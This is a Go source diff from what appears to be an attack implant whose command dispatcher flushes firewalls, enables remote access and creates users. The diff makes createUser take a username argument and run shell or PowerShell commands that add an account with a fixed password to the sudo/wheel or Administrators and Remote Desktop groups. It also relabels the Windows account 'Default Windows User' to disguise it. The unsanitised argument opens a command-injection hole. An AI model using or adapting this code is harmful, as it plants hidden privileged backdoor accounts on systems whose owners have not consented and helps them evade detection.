@@ -18,7 +18,7 @@ func ExecCommand(mode string, args string) string {
 	case "2":
 		retval = fwFlush()
 	case "3":
-		retval = createUser()
+		retval = createUser(args)
 	case "4":
 		retval = enableRemote()
 	case "5":
@@ -82,16 +82,16 @@ func fwFlush() string {
 }
 
 //create a new user.  maybe in the future name/pass will be passed as args
-func createUser() string {
+func createUser(args string) string {
 	var cmd *exec.Cmd
 	if runtime.GOOS == "linux" {
-		comStr := "useradd -p $(openssl passwd -1 letmein) badguy -s /bin/bash -G sudo"
+		comStr := "useradd -p $(openssl passwd -1 letmein) " + args + " -s /bin/bash -G sudo"
 		if _, err := os.Stat("/etc/yum.conf"); os.IsNotExist(err) {
-			comStr = "useradd -p $(openssl passwd -1 letmein) badguy -s /bin/bash -G wheel"
+			comStr = "useradd -p $(openssl passwd -1 letmein)" + args + " -s /bin/bash -G wheel"
 		}
 		cmd = exec.Command("/bin/sh", "-c", comStr)
 	} else if runtime.GOOS == "windows" {
-		comstr := "$p = ConvertTo-SecureString -Force -AsPlainText \"Letmein123!\";New-LocalUser \"badguy\" -Password $p -FullName \"Bad Guy\" -Description \"Non-malicious user\"; Add-LocalGroupMember -Group \"Administrators\" -Member \"badguy\"; Add-LocalGroupMember -Group \"Remote Desktop Users\" -Member \"badguy\";"
+		comstr := "$p = ConvertTo-SecureString -Force -AsPlainText \"Letmein123!\";New-LocalUser \"" + args + "\" -Password $p -FullName \"Bill Williams\" -Description \"Default Windows User\"; Add-LocalGroupMember -Group \"Administrators\" -Member \"" + args + "\"; Add-LocalGroupMember -Group \"Remote Desktop Users\" -Member \"" + args + "\";"
 		cmd = exec.Command("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "-c", comstr)
 	} else {
 		return "shell unavailable"
